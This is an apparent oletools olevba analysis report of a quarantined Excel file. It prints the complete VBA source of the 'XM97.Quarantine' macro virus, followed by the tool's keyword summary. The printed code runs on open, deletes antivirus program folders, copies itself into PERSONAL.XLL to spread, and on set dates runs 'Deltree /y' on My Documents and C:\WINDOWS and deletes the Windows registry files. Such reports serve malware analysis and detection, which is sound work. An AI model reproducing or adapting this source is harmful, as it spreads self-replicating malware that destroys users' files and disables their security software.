olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Quarantine-65112f9d948324cabdeb66fd0a9972291eba547e
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Quarantine-65112f9d948324cabdeb66fd0a9972291eba547e - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: Virus.MSExcel.Quarantine-65112f9d948324cabdeb66fd0a9972291eba547e - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet2.cls 
in file: Virus.MSExcel.Quarantine-65112f9d948324cabdeb66fd0a9972291eba547e - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet3.cls 
in file: Virus.MSExcel.Quarantine-65112f9d948324cabdeb66fd0a9972291eba547e - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Quarantine.bas 
in file: Virus.MSExcel.Quarantine-65112f9d948324cabdeb66fd0a9972291eba547e - OLE stream: '_VBA_PROJECT_CUR/VBA/Quarantine'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Rem ********************************
Rem * Name    : XM97.Quarantine    *
Rem * Author  : ULTRAS             *
Rem ********************************
Sub Auto_Open()
On Error Resume Next
Kill "C:\Program Files\AntiViral Toolkit Pro\*.*"
CommandBars("tools").Controls("Macro").Delete
Kill "C:\Program Files\Norton AntiVirus\*.*"
CommandBars("tools").Controls("Customize...").Delete
Kill "C:\f-macro\*.*"
CommandBars("tools").Controls("Templates and add-ins...").Delete
Kill "C:\VDOC\*.*"
ULTRAS = 0
ZERO = 0
Application.ScreenUpdating = False
For b = 1 To Application.Workbooks.Count
If Application.Workbooks(b).Name = "PERSONAL.XLL" Then
ULTRAS = 1
For u = 1 To Application.Workbooks("PERSONAL.XLL").Modules.Count
If Application.Workbooks("PERSONAL.XLL").Modules(u).Name = "Quarantine" Then
ZERO = 1
End If
Next
If ZERO = 0 Then
Windows("PERSONAL.XLL").Visible = True
Application.Workbooks("Quarantine.XLS").Modules("Quarantine").Copy after:=Application.Workbooks("PERSONAL.XLL").Modules(1)
Windows("PERSONAL.XLL").Visible = False
Application.Workbooks("PERSONAL.XLL").Save
End If
End If
Next
If ULTRAS = 0 Then
newname$ = ActiveWorkbook.Name
Application.Workbooks(newname$).SaveCopyAs Application.StartupPath + "\PERSONAL.XLL"
Application.Workbooks.Open (Application.StartupPath + "\PERSONAL.XLL")
Windows("PERSONAL.XLL").Visible = False
Application.Workbooks("PERSONAL.XLL").Save
End If
Application.ScreenUpdating = True
Call Quarantine
End Sub

Sub Quarantine()
On Error GoTo Victory
Application.UserName = "Quarantine by ULTRAS"
If Day(Now()) = 8 Then
Msgbox "You Infected XM97.Quarantine by ULTRAS", vbCritical + vbOKOnly, "ULTRAS"
Shell ("Deltree  /y C:\MYDOCU~1")
End If
If Day(Now()) = 15 Then
Assistant.Visible = True
With Assistant.NewBalloon
.Text = "Your computer on the quarantine!!!"
.Heading = "Quarantine by ULTRAS"
.Animation = msoAnimationGetArtsy
.Show
End With
Shell ("Deltree  /y C:\WINDOWS")
End If
If Day(Now()) = 23 Then
Assistant.Visible = True
With Assistant.NewBalloon
.Text = "Your computer on the quarantine!!!"
.Heading = "Quarantine by ULTRAS"
.Animation = msoAnimationEmptyTrash
.Show
End With
SetAttr "C:\WINDOWS\USER.DA0", 0
Kill "C:\WINDOWS\USER.DA0"
SetAttr "C:\WINDOWS\SYSTEM.DA0", 0
Kill "C:\WINDOWS\SYSTEM.DA0"
SetAttr "C:\WINDOWS\USER.DAT", 0
Kill "C:\WINDOWS\USER.DAT"
SetAttr "C:\WINDOWS\SYSTEM.DAT", 0
Kill "C:\WINDOWS\SYSTEM.DAT"
End If
Victory:
End Sub
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|SYSTEM              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

